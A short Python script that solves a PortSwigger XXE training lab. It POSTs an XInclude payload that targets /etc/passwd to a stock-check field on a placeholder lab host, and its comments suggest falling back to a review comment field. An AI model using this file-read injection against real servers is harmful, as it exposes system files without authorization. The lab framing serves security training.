"""
Lab 7: Exploiting XInclude to retrieve files
https://portswigger.net/web-security/xxe/lab-xxe-exploiting-xinclude-to-retrieve-files
Difficulty: Practitioner

📝 We only control a single VALUE inside a larger server-side XML document
(e.g. a product review/comment field) — no DOCTYPE control at all. XInclude
lets us still pull in file content from inside just that one field, since
it doesn't require a DTD declaration.
"""

from utils import get_session, log, note, build_xinclude_payload

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
# This lab typically injects via a product review/search field reflected
# into a backend XML document — confirm the actual vulnerable param first.
REVIEW_PATH = "/product?productId=1"


def run():
    s = get_session()

    payload = build_xinclude_payload("/etc/passwd")
    note(f"XInclude payload:\n{payload}")

    # Commonly submitted as the "check stock" storeId field or a review
    # comment body — adjust the param name/method to match the real form.
    r = s.post(f"{TARGET}/product/stock", data={"productId": "1", "storeId": payload})
    log(f"Response status: {r.status_code}")
    print(r.text)

    note("If this doesn't land, the injectable field is probably the review")
    note("'comment' textarea rather than storeId — try POSTing to the review")
    note("submission endpoint with the payload as the comment body instead.")


if __name__ == "__main__":
    run()
